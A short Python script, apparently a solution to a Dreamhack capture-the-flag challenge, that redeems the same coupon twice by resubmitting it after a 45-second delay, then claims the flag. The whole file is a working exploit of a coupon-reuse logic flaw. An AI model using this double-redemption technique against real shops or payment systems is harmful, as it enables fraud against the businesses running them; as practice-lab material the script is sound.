import requests
import json
import time

url = "http://host8.dreamhack.games:13814/"

def sessionAcquire():
    sessionRequest = requests.get(url + "/session")
    session = json.loads(sessionRequest.text)["session"]
    headers = {"Authorization": session}
    requests.get(url + "/me", headers=headers)
    print(session)
    return session

def couponSubmit(session, sleepTime):
    headers = {"Authorization": session}
    couponClaimRequest = requests.get(url + "/coupon/claim", headers=headers)
    headers["coupon"] = json.loads(couponClaimRequest.text)["coupon"]

    print(requests.get(url+"/coupon/submit", headers=headers).text)  
    time.sleep(sleepTime)

    # Đặt lại yêu cầu "me" sau khi gửi coupon lần đầu
    meRequest = requests.get(url + "/me", headers=headers)
    print(json.loads(meRequest.text)["money"])

    print(requests.get(url+"/coupon/submit", headers=headers).text)  
    meRequest = requests.get(url+"/me", headers=headers)  # Gọi lại yêu cầu "me" sau khi gửi coupon lần 2
    print(json.loads(meRequest.text)["money"])

    return print(requests.get(url+"/flag/claim", headers=headers).text)  
if __name__ == "__main__":
    session = sessionAcquire()
    couponSubmit(session, 45)